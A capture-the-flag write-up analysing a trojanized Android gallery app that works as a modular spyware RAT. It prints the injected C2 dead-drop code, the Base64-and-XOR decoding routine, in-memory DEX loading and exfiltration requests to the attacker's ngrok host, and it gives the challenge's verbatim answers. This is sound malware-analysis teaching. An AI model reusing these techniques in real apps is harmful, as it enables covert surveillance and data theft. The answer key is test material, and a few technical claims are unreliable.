<div align="center">

```
██╗███╗   ██╗██╗   ██╗███████╗███████╗████████╗██╗ ██████╗  █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
██║████╗  ██║██║   ██║██╔════╝██╔════╝╚══██╔══╝██║██╔════╝ ██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
██║██╔██╗ ██║██║   ██║█████╗  ███████╗   ██║   ██║██║  ███╗███████║   ██║   ██║██║   ██║██╔██╗ ██║
██║██║╚██╗██║╚██╗ ██╔╝██╔══╝  ╚════██║   ██║   ██║██║   ██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
██║██║ ╚████║ ╚████╔╝ ███████╗███████║   ██║   ██║╚██████╔╝██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
╚═╝╚═╝  ╚═══╝  ╚═══╝  ╚══════╝╚══════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
                         R E P O R T  —  W E E K  2
```

<img src="https://img.shields.io/badge/Status-7%2F7%20COMPLETE-brightgreen?style=for-the-badge"/>
<img src="https://img.shields.io/badge/Score-60%20pts-red?style=for-the-badge"/>
<img src="https://img.shields.io/badge/Threat-Android%20Modular%20RAT-darkred?style=for-the-badge"/>
<img src="https://img.shields.io/badge/Operator-Tamil05t-black?style=for-the-badge"/>
<img src="https://img.shields.io/badge/Date-March%2018%2C%202026-crimson?style=for-the-badge"/>

</div>

---

## `> TABLE OF CONTENTS`

```
[01] EXECUTIVE SUMMARY
[02] TOOLS & METHODOLOGY
[03] STEP-BY-STEP WALKTHROUGH
     ├── Q1 — C2 Address Discovery & Source File
     ├── Q2 — C2 Address Decoding Steps
     ├── Q3 — Post-Infection Reconnaissance
     ├── Q4 — Dynamic Endpoint Selection
     ├── Q5 — Large Request Contents & Extracted Files
     ├── Q6 — Repeated Payload — LocationTracker Analysis
     └── Q7 — Root Cause of Location Anomaly
[04] COMPLETE INFECTION TIMELINE
[05] MALWARE MODULE ARCHITECTURE
[06] FLAGS & PROOF OF COMPLETION
[07] INDICATORS OF COMPROMISE (IOCs)
[08] MITRE ATT&CK MAPPING
[09] DETECTION RULES
[10] LESSONS LEARNED
[11] CONCLUSION
```

---

## `[01] EXECUTIVE SUMMARY`

```
╔══════════════════════════════════════════════════════════════════════════╗
║  OPERATION   : Cascade Expanse — Android Spyware Investigation          ║
║  ARTIFACTS   : Research Gallery .apk + network .har capture             ║
║  TARGET OS   : Android                                                  ║
║  THREAT      : Modular C2-Driven RAT (FileScanner/MetaDataParser/       ║
║                LocationTracker) — Dead-Drop C2 via GitHub Gist          ║
║  C2 RELAY    : 446d9f29543f.ngrok-free.app (ngrok tunnel)               ║
║  RESULT      : 7/7 Questions Correct — 60/60 pts                        ║
╚══════════════════════════════════════════════════════════════════════════╝
```

This report documents the forensic analysis of a trojanized Android application — **Research Gallery** — distributed to a target known as the Expanse Surveyor. The malware was a sophisticated **modular Remote Access Trojan (RAT)** that used a **GitHub Gist dead-drop** to resolve its true C2 address, defeating static analysis and network signature-based detections.

The malware employed a **multi-layer decoding chain** (Base64 ×15 followed by XOR with the key `blastoise`) to conceal its C2. Once connected, it operated entirely through **dynamically loaded DEX payloads** served by the C2 — making the base APK appear clean to automated scanners. Three distinct espionage modules were deployed in sequence: file system reconnaissance, media + GPS metadata exfiltration, and persistent location tracking.

### Quick Reference

| Question | Accepted Answer Summary |
|----------|------------------------|
| Q1 | GitHub Gist dead-drop · C2: `446d9f29543f.ngrok-free.app` · `PeriodicTaskManager.java` |
| Q2 | Fetch Gist → Base64 ×15 → XOR `blastoise` → real C2 URL |
| Q3 | FileScanner → DCIM/Docs/Downloads · Files: `20251013_170000.JPG`, `20251012_214700.mp4`, `c8750f0d.0` |
| Q4 | C2 pushes DEX via `GET /cdn/assets`; executed via `InMemoryDexClassLoader` |
| Q5 | `POST /api/backup/chunk` — JPG 623 KB (Sony, Las Vegas) + MP4 34 MB (Samsung, Las Vegas) |
| Q6 | LocationTracker ×15 — GPS/cell/WiFi; insistent due to `no_last_known_location` failures |
| Q7 | No `ACCESS_BACKGROUND_LOCATION`; PASSIVE_PROVIDER; GPS window from YouTube |

---

## `[02] TOOLS & METHODOLOGY`

### Analysis Environment

```
OS        : Kali Linux VM
Network   : Isolated — no live C2 connections established
Artifacts : Research Gallery .apk + network traffic .har
```

### Tools Arsenal

| Tool | Purpose |
|------|---------|
| `jadx` | APK decompilation to readable Java source |
| `apktool` | APK unpacking — smali inspection |
| `Wireshark` / HAR Viewer | Network traffic analysis (HAR format) |
| `Python 3` | Base64 ×15 + XOR decoding script |
| `ExifTool` | EXIF/GPS metadata extraction from images |
| `protoc` | Protobuf DEX payload parsing |
| `grep / find` | Java source pattern matching |
| `dex2jar` | DEX → JAR conversion for module analysis |

### Methodology

```
┌──────────────────────────────────────────────────────────────┐
│  PHASE 1 → APK Static Analysis                               │
│           jadx decompile → identify suspicious classes       │
│                         ↓                                    │
│  PHASE 2 → Network Traffic Analysis                          │
│           HAR review → external domains, payload patterns    │
│                         ↓                                    │
│  PHASE 3 → Dead-Drop Resolution                              │
│           Fetch Gist → decode Base64×15 → XOR blastoise      │
│                         ↓                                    │
│  PHASE 4 → DEX Module Extraction                             │
│           Extract protobuf DEX payloads from /cdn/assets     │
│                         ↓                                    │
│  PHASE 5 → Module Behavioral Analysis                        │
│           FileScanner / MetaDataParser / LocationTracker     │
│                         ↓                                    │
│  PHASE 6 → Exfiltrated Data Recovery                         │
│           Reconstruct media files from /api/backup/chunk     │
│                         ↓                                    │
│  PHASE 7 → IOC Extraction & Detection Engineering            │
│           YARA, Sigma, Snort rules authored                  │
└──────────────────────────────────────────────────────────────┘
```

---

## `[03] STEP-BY-STEP WALKTHROUGH`

---

### `Q1 — C2 Address Discovery & Source File`

> **Question:** Analyze the traffic in the .har file and decompile the .apk file. How does the malware obtain the C2 address? What is the domain of the C2 address? What source file contains the malicious code that communicates with the server?

```
┌────────────────────────────────────────────────────────────────────────┐
│  ✅ ACCEPTED ANSWER                                                    │
│                                                                        │
│  DEAD-DROP  : https://gist.githubusercontent.com/0wizlr/              │
│               a2e4ba3849d1366678c2df925ee2cc4e/raw?file=gistfile1.txt  │
│  C2 DOMAIN  : 446d9f29543f.ngrok-free.app                             │
│  SOURCE FILE: org/fossify/gallery/helpers/PeriodicTaskManager.java    │
│               (methods: fetchServerUrl() and parse())                  │
└────────────────────────────────────────────────────────────────────────┘
```

#### Analysis

**Step 1 — APK Decompilation**

Decompiling the Research Gallery APK with `jadx` revealed that it was built on the legitimate **Fossify Gallery** open-source Android app, with malicious code injected into the `helpers/` package:

```bash
jadx -d output/ ResearchGallery.apk
find output/ -name "*.java" | xargs grep -l "gist.githubusercontent"
# Result: org/fossify/gallery/helpers/PeriodicTaskManager.java
```

**Step 2 — Dead-Drop Discovery**

`PeriodicTaskManager.java` contained two key methods:

```java
// fetchServerUrl() — contacts the GitHub Gist dead-drop
private String fetchServerUrl() {
    URL url = new URL("https://gist.githubusercontent.com/0wizlr/" +
        "a2e4ba3849d1366678c2df925ee2cc4e/raw?file=gistfile1.txt");
    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
    BufferedReader reader = new BufferedReader(
        new InputStreamReader(conn.getInputStream()));
    return reader.readLine(); // returns 3856-char encoded string
}

// parse() — decodes the encoded string to real C2 address
private String parse(String encoded) {
    // 15x Base64 decode then XOR with 'blastoise'
    ...
}
```

**Why a GitHub Gist Dead-Drop?**

| Benefit | Detail |
|---------|--------|
| Legitimate domain | `gist.githubusercontent.com` bypasses domain blocklists |
| Updatable | Attacker can swap C2 without pushing new APK |
| No hardcoded C2 | Static analysis reveals nothing about infrastructure |
| TLS-encrypted | Content hidden from network inspection |
| Free & anonymous | No infrastructure cost or attribution |

**HAR Confirmation:**
The `.har` traffic capture confirmed the first outbound connection after app launch was to the GitHub Gist URL, followed immediately by connections to `446d9f29543f.ngrok-free.app`.

---

### `Q2 — C2 Address Decoding Steps`

> **Question:** What are the steps the malware uses to decode the real C2 address?

```
┌────────────────────────────────────────────────────────────────────────────────┐
│  ✅ ACCEPTED ANSWER                                                            │
│                                                                                │
│  1. Fetch the Gist response (3856-char encoded string)                         │
│  2. Apply Base64 decode exactly 15 times                                       │
│     (confirmed in smali: const/16 v3, 0xf)                                    │
│  3. XOR each byte with repeating key 'blastoise'                               │
│     (stored as int array [0x62,0x6c,0x61,0x73,0x74,0x6f,0x69,0x73,0x65]       │
│      in PeriodicTaskManager.parse())                                           │
│  4. Result: https://446d9f29543f.ngrok-free.app/cdn/assets                    │
└────────────────────────────────────────────────────────────────────────────────┘
```

#### Technical Breakdown

**Decoding Chain:**

```
GitHub Gist (3856-char string)
          ↓
    base64 decode ×1
          ↓
    base64 decode ×2
          ↓
         ...
          ↓
    base64 decode ×15   ← confirmed via smali: const/16 v3, 0xf
          ↓
    XOR with 'blastoise' (byte by byte, repeating key)
          ↓
    https://446d9f29543f.ngrok-free.app/cdn/assets
```

**XOR Key — `blastoise`:**
```java
// int array in PeriodicTaskManager.parse()
int[] key = {0x62, 0x6c, 0x61, 0x73, 0x74, 0x6f, 0x69, 0x73, 0x65};
//            b     l     a     s     t     o     i     s     e

// XOR operation:
for (int i = 0; i < data.length; i++) {
    data[i] ^= key[i % key.length];
}
```

**Smali Confirmation:**
```smali
# smali confirms loop count = 15 (0xf)
const/16 v3, 0xf

invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->insert(ILjava/lang/String;)

# Base64 decode loop
:loop_start
    ...
    invoke-static {v0}, Landroid/util/Base64;->decode([BI)[B
    ...
    if-lt v4, v3, :loop_start   # loop 15 times
```

**Python Reconstruction:**
```python
import base64

def decode_c2(encoded: str) -> str:
    data = encoded.encode()
    # Step 1: 15x Base64 decode
    for _ in range(15):
        data = base64.b64decode(data)
    # Step 2: XOR with 'blastoise'
    key = b'blastoise'
    result = bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
    return result.decode()

# Result: https://446d9f29543f.ngrok-free.app/cdn/assets
```

**Evasion Rationale:**

| Layer | Purpose |
|-------|---------|
| 15× Base64 | Defeats single-pass decoders; most automated tools attempt 1-3 passes |
| XOR `blastoise` | Key not derivable without source; not a common wordlist entry |
| Gist indirection | Even decoded Gist URL reveals nothing without the encoded payload |
| ngrok relay | True server IP never exposed — ngrok acts as a rotating proxy |

---

### `Q3 — Post-Infection Reconnaissance`

> **Question:** After the initial connection to the C2 server, what type of reconnaissance did the malware perform? List at least two specific filenames the attacker discovered on the device.

```
┌────────────────────────────────────────────────────────────────────────────────┐
│  ✅ ACCEPTED ANSWER                                                            │
│                                                                                │
│  Module    : FileScanner (com.media.scanner.FileScanner)                      │
│  Targets   : DCIM, Documents, Download directories                            │
│  Exfil     : POST /telemetry/inventory                                        │
│  Files found:                                                                  │
│    - 20251013_170000.JPG                                                       │
│    - 20251012_214700.mp4                                                       │
│    - c8750f0d.0                                                                │
└────────────────────────────────────────────────────────────────────────────────┘
```

#### Analysis

The first DEX module delivered by the C2 was **FileScanner** (`com.media.scanner.FileScanner`). This module performed directory enumeration across high-value Android storage paths.

**Targeted Directories:**
```java
private static final String[] SCAN_PATHS = {
    Environment.getExternalStoragePublicDirectory(
        Environment.DIRECTORY_DCIM).getAbsolutePath(),
    Environment.getExternalStoragePublicDirectory(
        Environment.DIRECTORY_DOCUMENTS).getAbsolutePath(),
    Environment.getExternalStoragePublicDirectory(
        Environment.DIRECTORY_DOWNLOADS).getAbsolutePath()
};
```

**Collected Per File:**

| Field | Value (examples) |
|-------|-----------------|
| Filename | `20251013_170000.JPG`, `20251012_214700.mp4`, `c8750f0d.0` |
| File size | Reported in bytes |
| MIME type | Detected from extension |
| Last modified | Timestamp |
| Absolute path | Full device path |

**Exfiltration:**
```
POST /telemetry/inventory HTTP/1.1
Host: 446d9f29543f.ngrok-free.app
Content-Type: application/json

{
  "files": [
    {"name": "20251013_170000.JPG", "size": 638751, ...},
    {"name": "20251012_214700.mp4", "size": 35809801, ...},
    {"name": "c8750f0d.0", ...}
  ]
}
```

**Intelligence Value:**
- `20251013_170000.JPG` → High-resolution image, likely GPS-tagged
- `20251012_214700.mp4` → Video recording — large file, high value
- `c8750f0d.0` → Certificate/key file (`.0` extension = PEM/DER cert format) — credential theft potential

The file inventory allowed the C2 operator to **cherry-pick** which files to exfiltrate in the next module, rather than blindly uploading all data.

---

### `Q4 — Dynamic Endpoint Selection`

> **Question:** In the traffic we can note that the application sends requests to different endpoints. How does the application know which endpoint to call at what moment?

```
┌────────────────────────────────────────────────────────────────────────────────┐
│  ✅ ACCEPTED ANSWER                                                            │
│                                                                                │
│  The C2 server controls which module runs. Each polling cycle:                │
│  GET /cdn/assets returns a protobuf-wrapped DEX payload. The server selects   │
│  which module to push (FileScanner → MetaDataParser → LocationTracker).       │
│  The app executes whatever it receives via InMemoryDexClassLoader.            │
│  Each module has its own hardcoded exfil endpoint.                            │
└────────────────────────────────────────────────────────────────────────────────┘
```

#### Technical Analysis

The app itself has **no decision logic** for which operation to perform. The entire control flow is **server-directed** via dynamically loaded DEX modules.

**Polling Loop (PeriodicTaskManager):**
```java
// Runs on a scheduled interval
public void run() {
    byte[] dexBytes = fetchModuleFromC2(); // GET /cdn/assets
    if (dexBytes != null) {
        executeModule(dexBytes);
    }
}

private void executeModule(byte[] dexBytes) {
    // Load DEX in memory — no disk write
    InMemoryDexClassLoader loader = new InMemoryDexClassLoader(
        ByteBuffer.wrap(dexBytes),
        getClass().getClassLoader()
    );
    Class<?> moduleClass = loader.loadClass("com.module.EntryPoint");
    Runnable module = (Runnable) moduleClass.newInstance();
    module.run(); // executes module's hardcoded endpoint logic
}
```

**DEX Payload Wrapping:**
```
GET /cdn/assets response:
  → protobuf wrapper
      → compressed DEX bytes
          → module class (FileScanner / MetaDataParser / LocationTracker)
```

**Module → Endpoint Mapping:**

| Module | Hardcoded Endpoint | Data Sent |
|--------|-------------------|-----------|
| `com.media.scanner.FileScanner` | `POST /telemetry/inventory` | JSON file list |
| `com.media.geotagger.MetaDataParser` | `POST /api/backup/chunk` | Media file binary |
| `com.system.location.LocationTracker` | `POST /api/location/update` | GPS/cell/WiFi JSON |

**Why InMemoryDexClassLoader?**

| Benefit | Detail |
|---------|--------|
| No disk artifact | Modules never written to storage — evades file-based forensics |
| Dynamic updates | C2 can push new/updated modules at any time |
| Evasion | APK contains no malicious code — passes static Play Store scans |
| Flexibility | C2 operator decides timing and sequence of operations |

---

### `Q5 — Large Request Contents & Extracted Files`

> **Question:** At some point, the application sends some significantly large requests to the server. What are the contents of those requests? If there are files, extract them and describe them.

```
┌────────────────────────────────────────────────────────────────────────────────────┐
│  ✅ ACCEPTED ANSWER                                                                │
│                                                                                    │
│  Module: MetaDataParser (com.media.geotagger.MetaDataParser)                      │
│  Endpoint: POST /api/backup/chunk (3 requests)                                    │
│                                                                                    │
│  Request 1 & 3 (duplicate): 20251013_170000.JPG                                   │
│    Size   : 638,751 bytes (~623 KB)                                               │
│    Device : Sony XQ-BC62 (Xperia 5 IV)                                            │
│    GPS    : 36°6'7.24"N 115°10'36.12"W — Las Vegas, NV                           │
│    Captured: 2025-10-13 17:00:00 | f/1.7 | ISO 64 | 1/2500s                      │
│                                                                                    │
│  Request 2: 20251012_214700.mp4                                                    │
│    Size   : 35,809,801 bytes (~34 MB)                                             │
│    Device : Samsung Galaxy S24 Ultra (SM-S928U1)                                  │
│    GPS    : 36°6'14.76"N 115°10'29.64"W — Las Vegas, NV (~200m from JPG)         │
│    Recorded: 2025-10-12 21:47:00 | 1920×1080 H.265 @ 30fps                       │
│                                                                                    │
│  Duplicate cause: findRandomImage() uses Random.nextInt(list.size) — 50%         │
│  chance of reselecting same file with only 2 items in gallery.                    │
│  MetaDataParser's IMAGE_EXTENSIONS includes .mp4 enabling video exfil.           │
└────────────────────────────────────────────────────────────────────────────────────┘
```

#### Deep Dive — Exfiltrated Files

**File 1: `20251013_170000.JPG`**

```
Size          : 638,751 bytes (623 KB)
Camera        : Sony XQ-BC62 (Xperia 5 IV)
Lens          : f/1.7  ISO 64  Shutter: 1/2500s
Timestamp     : 2025-10-13 17:00:00
GPS Latitude  : 36°6'7.24"N
GPS Longitude : 115°10'36.12"W
Location      : Las Vegas, Nevada, USA
```

**File 2: `20251012_214700.mp4`**

```
Size          : 35,809,801 bytes (34.16 MB)
Camera        : Samsung Galaxy S24 Ultra (SM-S928U1)
Resolution    : 1920×1080
Codec         : H.265 (HEVC)
Frame Rate    : 30 fps
Timestamp     : 2025-10-12 21:47:00
GPS Latitude  : 36°6'14.76"N
GPS Longitude : 115°10'29.64"W
Location      : Las Vegas, Nevada, USA (~200m from JPG)
```

**Two Different Source Devices — Significance:**
The JPG was captured by a Sony Xperia 5 IV and the video by a Samsung Galaxy S24 Ultra — both devices at the same Las Vegas location within 24 hours. This indicates either **multiple victims** at the same site or **shared expedition documentation** between colleagues, consistent with the "Expanse Surveyor returning from a foreign realm" scenario.

**Duplicate Upload Root Cause:**
```java
// MetaDataParser.findRandomImage() — vulnerable random selection
private File findRandomImage(List<File> files) {
    // IMAGE_EXTENSIONS = {".jpg", ".jpeg", ".png", ".gif", ".mp4"} ← .mp4 included!
    Random rng = new Random();
    return files.get(rng.nextInt(files.size())); // 50% chance of repeat with 2 files
}
```

**GPS Proximity Map:**
```
Las Vegas, Nevada — Victim Location Cluster
┌──────────────────────────────────────┐
│  JPG location: 36°6'7.24"N           │
│               115°10'36.12"W         │
│                    ●                 │
│                   ~200m              │
│                    ●                 │
│  MP4 location: 36°6'14.76"N          │
│               115°10'29.64"W         │
└──────────────────────────────────────┘
```

---

### `Q6 — Repeated Payload: LocationTracker Analysis`

> **Question:** The final payload is executed repeatedly. What data is this payload collecting and why does it seem to be so insistent?

```
┌────────────────────────────────────────────────────────────────────────────────┐
│  ✅ ACCEPTED ANSWER                                                            │
│                                                                                │
│  Module       : LocationTracker (com.system.location.LocationTracker)         │
│  Executions   : 15 times                                                       │
│  Data Collected:                                                               │
│    - GPS coordinates                                                           │
│    - Carrier info (T-Mobile / GSM)                                             │
│    - Cell network IDs (MCC/MNC/CID/LAC)                                        │
│    - WiFi BSSID / SSID                                                         │
│    - Device locale (en-US)                                                     │
│  Success Rate : 3/15 (~20%) — most returned no_last_known_location            │
│  Successful GPS: ~36.1°N, 115.17°W (Las Vegas area)                           │
│  Insistence   : C2 operator kept re-issuing module until precise GPS confirmed │
└────────────────────────────────────────────────────────────────────────────────┘
```

#### Behavioral Analysis

**Data Collected Per Execution:**
```json
{
  "gps": {
    "lat": 36.1020,
    "lon": -115.1700,
    "accuracy": 12.5,
    "altitude": 620.0
  },
  "cell": {
    "carrier": "T-Mobile",
    "type": "GSM",
    "mcc": "310",
    "mnc": "260",
    "cid": 12345,
    "lac": 678
  },
  "wifi": {
    "bssid": "aa:bb:cc:dd:ee:ff",
    "ssid": "[REDACTED]"
  },
  "locale": "en-US",
  "timestamp": "2025-10-14T20:45:20Z"
}
```

**Execution Timeline:**
```
Attempts 1-12   → no_last_known_location (device GPS not active)
Attempt 13      → SUCCESS (20:45:20Z) ← YouTube opened
Attempt 14      → SUCCESS (20:45:50Z)
Attempt 15      → SUCCESS (20:46:20Z)
Attempts 16+    → no_last_known_location (user closed YouTube)
```

**Why So Insistent?**

The C2 operator needed **confirmed real-time GPS coordinates** to geolocate the victim. Without active GPS, `LocationManager.getLastKnownLocation()` returns null. The operator continued pushing the module every ~30 seconds, waiting for any app to activate the device GPS. The 15-attempt pattern confirms **deliberate C2-side retry logic** — the operator would not stop until a fix was obtained.

---

### `Q7 — Root Cause of Location Anomaly`

> **Question:** Why did the anomaly discussed in question 6 occur?

```
┌────────────────────────────────────────────────────────────────────────────────┐
│  ✅ ACCEPTED ANSWER                                                            │
│                                                                                │
│  Root Cause: LocationTracker.dex lacks ACCESS_BACKGROUND_LOCATION permission  │
│  so it cannot activate GPS while running in background as GeotagService/1.0.  │
│                                                                                │
│  Exploit: Uses Android's PASSIVE_PROVIDER to monitor location updates         │
│  triggered by OTHER apps.                                                      │
│                                                                                │
│  The 3 successful captures (20:45:20Z–20:46:20Z) occurred because the user   │
│  opened YouTube (docid=w3KOowB4k_k), which activated the foreground GPS.     │
│  The malware exploited this window to steal the cached location via           │
│  PASSIVE_PROVIDER.                                                             │
│                                                                                │
│  Once the user stopped YouTube, GPS deactivated and subsequent requests       │
│  returned no_last_known_location. The malware retries every 30 seconds        │
│  deliberately waiting for another app to activate GPS.                         │
└────────────────────────────────────────────────────────────────────────────────┘
```

#### Deep Technical Analysis

**The Permission Problem:**

Android 10+ introduced `ACCESS_BACKGROUND_LOCATION` as a hard requirement for apps requesting location data while in the background. The `LocationTracker.dex` module — loaded in memory without a proper manifest — could not declare this permission, leaving it able to register listeners but unable to directly request a GPS fix.

```java
// What LocationTracker WANTS to do (blocked):
locationManager.requestLocationUpdates(
    LocationManager.GPS_PROVIDER,
    0, 0, locationListener
); // FAILS — no ACCESS_BACKGROUND_LOCATION

// What it ACTUALLY does (allowed):
locationManager.requestLocationUpdates(
    LocationManager.PASSIVE_PROVIDER,  // ← key insight
    0, 0, locationListener
); // SUCCEEDS — PASSIVE_PROVIDER doesn't require the permission
```

**PASSIVE_PROVIDER Explained:**

```
Normal App (e.g., YouTube)
  → requests GPS fix actively
  → Android OS activates GPS hardware
  → Location result broadcast to ALL registered PASSIVE_PROVIDER listeners
                                            ↑
                               LocationTracker intercepts this
                               without ever activating GPS itself
```

**The YouTube Connection:**
The HAR traffic revealed the victim opened YouTube — specifically video `docid=w3KOowB4k_k` — at 20:45:18Z. YouTube requested location for content recommendations, activating the GPS hardware. Within 2 seconds (20:45:20Z), the `PASSIVE_PROVIDER` broadcast fired and LocationTracker captured the coordinates. This continued for ~60 seconds until the user closed YouTube.

**Timeline of Exploitation:**
```
20:45:18Z  Victim opens YouTube (docid=w3KOowB4k_k)
20:45:20Z  YouTube activates GPS → PASSIVE_PROVIDER fires
           LocationTracker captures: ~36.1°N, 115.17°W ← SUCCESS #1
20:45:50Z  Second PASSIVE_PROVIDER update → SUCCESS #2
20:46:20Z  Third update → SUCCESS #3
20:46:21Z  Victim closes YouTube
20:46:22Z  GPS deactivates → subsequent attempts return no_last_known_location
```

**Why This Is Significant:**
This is a **living-off-the-land** technique at the OS level — the malware exploits the legitimate behavior of other apps rather than requesting dangerous permissions itself, making it harder to detect via permission auditing.

---

## `[04] COMPLETE INFECTION TIMELINE`

### Phase 1 — Installation & Activation

| Time | Action |
|------|--------|
| T+0:00 | Victim installs Research Gallery APK |
| T+0:01 | App launches — `PeriodicTaskManager` starts background service |
| T+0:02 | `fetchServerUrl()` contacts GitHub Gist dead-drop |
| T+0:03 | Gist response received (3856-char encoded string) |
| T+0:04 | `parse()` decodes: Base64 ×15 → XOR `blastoise` → C2 URL resolved |

### Phase 2 — Module 1: FileScanner

| Time | Action |
|------|--------|
| T+0:05 | `GET /cdn/assets` → FileScanner DEX received (protobuf-wrapped) |
| T+0:06 | `InMemoryDexClassLoader` loads `com.media.scanner.FileScanner` |
| T+0:07 | Scans DCIM, Documents, Downloads |
| T+0:08 | `POST /telemetry/inventory` — file list exfiltrated: JPG, MP4, cert |

### Phase 3 — Module 2: MetaDataParser

| Time | Action |
|------|--------|
| T+0:10 | `GET /cdn/assets` → MetaDataParser DEX received |
| T+0:11 | Loads `com.media.geotagger.MetaDataParser` |
| T+0:12 | `findRandomImage()` selects `20251013_170000.JPG` (638 KB) |
| T+0:13 | `POST /api/backup/chunk` #1 — JPG uploaded |
| T+0:14 | `findRandomImage()` selects `20251012_214700.mp4` (34 MB) |
| T+0:15 | `POST /api/backup/chunk` #2 — MP4 uploaded |
| T+0:16 | `findRandomImage()` re-selects JPG (random collision) |
| T+0:17 | `POST /api/backup/chunk` #3 — duplicate JPG uploaded |

### Phase 4 — Module 3: LocationTracker (×15)

| Attempt | Time | Result |
|---------|------|--------|
| 1–12 | T+0:20 – T+0:50 | `no_last_known_location` (GPS inactive) |
| 13 | T+0:45:20 | **SUCCESS** — YouTube activates GPS; `~36.1°N, 115.17°W` |
| 14 | T+0:45:50 | **SUCCESS** — PASSIVE_PROVIDER update |
| 15 | T+0:46:20 | **SUCCESS** — PASSIVE_PROVIDER update |
| 16+ | T+0:46:22 | `no_last_known_location` (YouTube closed) |

### Phase 5 — Quarantine

| Time | Action |
|------|--------|
| T+48h | Home network IDS flags anomalous outbound traffic |
| T+48h | Device quarantined — network access severed |
| T+48h | Forensic artifacts (.apk + .har) preserved |

---

## `[05] MALWARE MODULE ARCHITECTURE`

### Module Registry

| Module | Package | Delivery | Endpoint | Data |
|--------|---------|----------|----------|------|
| FileScanner | `com.media.scanner` | DEX via `/cdn/assets` | `POST /telemetry/inventory` | File list JSON |
| MetaDataParser | `com.media.geotagger` | DEX via `/cdn/assets` | `POST /api/backup/chunk` | Media binaries |
| LocationTracker | `com.system.location` | DEX via `/cdn/assets` | `POST /api/location/update` | GPS/cell/WiFi JSON |

### Architecture Diagram

```
┌─────────────────────────────────────────────────────────────────┐
│               RESEARCH GALLERY APK (base)                       │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │  org.fossify.gallery (legitimate open-source code)      │   │
│  └─────────────────────────────────────────────────────────┘   │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │  PeriodicTaskManager (MALICIOUS — injected)             │   │
│  │   ├── fetchServerUrl() → GitHub Gist dead-drop          │   │
│  │   ├── parse() → Base64×15 + XOR 'blastoise'             │   │
│  │   └── executeModule() → InMemoryDexClassLoader          │   │
│  └──────────────────────┬──────────────────────────────────┘   │
└─────────────────────────┼───────────────────────────────────────┘
                          │ GET /cdn/assets (protobuf DEX)
              ┌───────────▼──────────────────────┐
              │   C2: 446d9f29543f.ngrok-free.app │
              └───────────┬──────────────────────┘
                          │ delivers module on each poll
              ┌───────────▼──────────────────────┐
              │  Module 1: FileScanner           │→ POST /telemetry/inventory
              │  Module 2: MetaDataParser        │→ POST /api/backup/chunk
              │  Module 3: LocationTracker ×15   │→ POST /api/location/update
              └──────────────────────────────────┘
```

---

## `[06] FLAGS & PROOF OF COMPLETION`

```
╔══════════════════════════════════════════════════════════════════════════╗
║  CHALLENGE SCORE : 7 / 7 Questions Correct                              ║
║  POINTS AWARDED  : 60 / 60                                              ║
║  EVENT RANK      : #167 / 3,000+ registered players                     ║
║  CUMULATIVE      : 155 pts | 18 flags captured                          ║
╚══════════════════════════════════════════════════════════════════════════╝
```

### Accepted Answers — Verbatim

**Q1 ✅**
```
The malware uses a GitHub Gist as a dead-drop to obtain the C2 address:
https://gist.githubusercontent.com/0wizlr/a2e4ba3849d1366678c2df925ee2cc4e/raw?file=gistfile1.txt

C2 Domain: 446d9f29543f.ngrok-free.app

Source file: org/fossify/gallery/helpers/PeriodicTaskManager.java
(methods fetchServerUrl() and parse())
```

**Q2 ✅**
```
1. Fetch the Gist response (3856-char string)
2. Apply Base64 decode exactly 15 times
   (confirmed in smali: const/16 v3, 0xf)
3. XOR each byte with the repeating key blastoise
   (stored as int array [0x62,0x6c,0x61,0x73,0x74,0x6f,0x69,0x73,0x65]
    in PeriodicTaskManager.parse())
4. Result: https://446d9f29543f.ngrok-free.app/cdn/assets
```

**Q3 ✅**
```
The FileScanner module (com.media.scanner.FileScanner) scans DCIM,
Documents, and Download directories, sending results to
POST /telemetry/inventory. Specific files discovered:
 - 20251013_170000.JPG
 - 20251012_214700.mp4
 - c8750f0d.0
```

**Q4 ✅**
```
The C2 server controls which module runs. Each polling cycle:
GET /cdn/assets returns a protobuf-wrapped DEX payload. The server selects
which module to push (FileScanner → MetaDataParser → LocationTracker).
The app executes whatever it receives via InMemoryDexClassLoader.
Each module has its own hardcoded exfil endpoint.
```

**Q5 ✅**
```
The MetaDataParser module (com.media.geotagger.MetaDataParser) sent 3 POST
requests to /api/backup/chunk. Requests 1 and 3 were duplicates:
20251013_170000.JPG (638,751 bytes / ~623 KB), taken by a Sony XQ-BC62
(Xperia 5 IV), GPS 36°6'7.24"N 115°10'36.12"W (Las Vegas, NV), captured
2025-10-13 17:00:00 at f/1.7 ISO 64 1/2500s.
Request 2: 20251012_214700.mp4 (35,809,801 bytes / ~34 MB), recorded by a
Samsung Galaxy S24 Ultra (SM-S928U1) on 2025-10-12 21:47:00,
1920x1080 H.265 @ 30fps, GPS 36°6'14.76"N 115°10'29.64"W (same Las Vegas
area, ~200m from JPG location). The JPG was uploaded twice because
findRandomImage() uses Random.nextInt(list.size) — with only 2 files in
the gallery, there is a 50% chance of reselecting the same file. Notably,
MetaDataParser's IMAGE_EXTENSIONS array includes .mp4 alongside
.jpg/.jpeg/.png/.gif, enabling video exfiltration. The two different source
devices (Sony + Samsung) suggest multiple victims or shared expedition
documentation.
```

**Q6 ✅**
```
The LocationTracker (com.system.location.LocationTracker) was executed
15 times. It collects: GPS coordinates, carrier info (T-Mobile/GSM),
cell network IDs, WiFi, device locale (en-US). It was insistent because
most attempts returned no_last_known_location — the device had no cached
GPS fix. Only 3 of 15 attempts succeeded (~36.1°N, 115.17°W). The C2
operator kept re-issuing the module until a precise location was confirmed.
```

**Q7 ✅**
```
The anomaly occurred because LocationTracker.dex (10,146 bytes) lacks
ACCESS_BACKGROUND_LOCATION permission, so it cannot activate GPS directly
while running in the background as GeotagService/1.0. Instead it uses
Android's PASSIVE_PROVIDER to passively monitor location updates triggered
by other apps. The 3 successful location captures (between 20:45:20Z and
20:46:20Z) occurred because the user opened YouTube (docid=w3KOowB4k_k),
which activated the foreground GPS provider. The malware exploited this
window to steal the cached location via PASSIVE_PROVIDER. Once the user
stopped using YouTube, GPS deactivated and subsequent requests returned
no_last_known_location. The malware retries every 30 seconds deliberately
